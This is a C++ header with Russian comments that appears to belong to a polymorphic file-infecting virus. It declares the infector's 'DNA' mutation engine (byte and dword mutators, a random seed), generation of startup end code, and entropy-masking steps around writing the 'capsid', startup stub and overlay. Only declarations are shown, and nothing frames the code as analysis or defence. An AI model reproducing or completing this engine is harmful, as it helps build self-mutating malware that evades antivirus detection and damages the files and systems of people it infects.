#pragma once

#include "global.hpp"

typedef enum dna_mutations_types_
{
	MUTATOR_BYTEARRAY_REPLACE = 0, // заменяет байты случайного окна на случайную последовательность
	MUTATOR_BYTEARRAY_INCDEC, // инкрементирует-декрементирует каждый байт случайного окна (инкремент-декремент выбирается случайно
	MUTATOR_BYTEARRAY_INVERSE, // выбирает окно из байтов и инвертирует каждый байт
	MUTATOR_INVERSE, // инвертирует один случайный дворд
	MUTATOR_REPLACE, // заменяет один случайный дворд на рандом
	MUTATOR_SWAP, // меняет местами два дворда
	MUTATOR_INCDEC, // инкрементирует или декрементирует случайный дворд
	MUTATOR_SKIP, // не мутирует
	MUTATOR_TOTAL_TYPES
} dna_mutations_types_t;

typedef enum startup_endcode_types_
{
	ENDCODE_EMPTY = 0, // без завершающего кода
	ENDCODE_FPU, // генерируем только FPU
	ENDCODE_DEFAULTINST, // дефолт инструкции интела
	ENDCODE_FUNCLAYER, // генерировать функции
	TOTAL_STARTUPENCODE_TYPES
} startup_endcode_types_t;

typedef enum entropyfix_types_
{
	ENTROPYFIX_BEFORE_CAPSID = 0, // означает фикс энтропии до записи капсида
	ENTROPYFIX_BEFORE_STARTUP, // означает фикс энтропии до записи стартапа
	ENTROPYFIX_BEFORE_OVERLAY, // означает фикс энтропии после записи стартапа
	ENTROPYFIX_TOTAL_TYPES
} entropyfix_types_t;

// интерфейс для работы с ДНК-кодом инфектора
class IDNAProcessor
{
public:
	virtual ~IDNAProcessor() = default;
	virtual BOOL init(LPBYTE lpDataArray, SIZE_T dwDataSize) = 0;
	virtual BOOL mutate(DWORD dwParamMutation) = 0;
	virtual DWORD get_value(DWORD dwValueIndex, BOOL bOriginal, DWORD dwOffset, DWORD dwMax) = 0;
	virtual BOOL update() = 0;
	virtual LPBYTE get_dna() = 0;
};

class DefaultDNAProcessor : public IDNAProcessor
{
public:
	DefaultDNAProcessor();
	~DefaultDNAProcessor();
	// ожидает метаданные капсида - расшифрует расширенную инфу для работы с ДНК-кодом
	BOOL init(LPBYTE lpDataArray, SIZE_T dwDataSize);
	// замутирует ДНК-код если dwParamMutation превышает dwMutatorBorder
	BOOL mutate(DWORD dwParamMutation);
	// вернет редуцированное значение из ДНК-кода по индексу dwValueIndex через (lpdwords[dwValueIndex] % dwMax) + dwOffset
	// если флаг bOriginal, то не редуцирует и вернет оригинал, dwOffset и dwMax игнорируются
	DWORD get_value(DWORD dwValueIndex, BOOL bOriginal, DWORD dwOffset, DWORD dwMax);
	// перезапишет в капсиде capsid_extended на новое значение с измененным ДНК-кодом
	BOOL update();

	LPBYTE get_dna();

protected:
	VOID bytearray_mutate(DWORD dwParam);
	VOID singledword_mutate(DWORD dwParam);
	VOID twodword_mutate(DWORD dwParam);

private:
	capsid_metadata *capsid;
	capsid_extended *extended;
	// указатель на ДНК-код инфектора
	PDWORD32 pdwDNACode;
	long holdrand;
};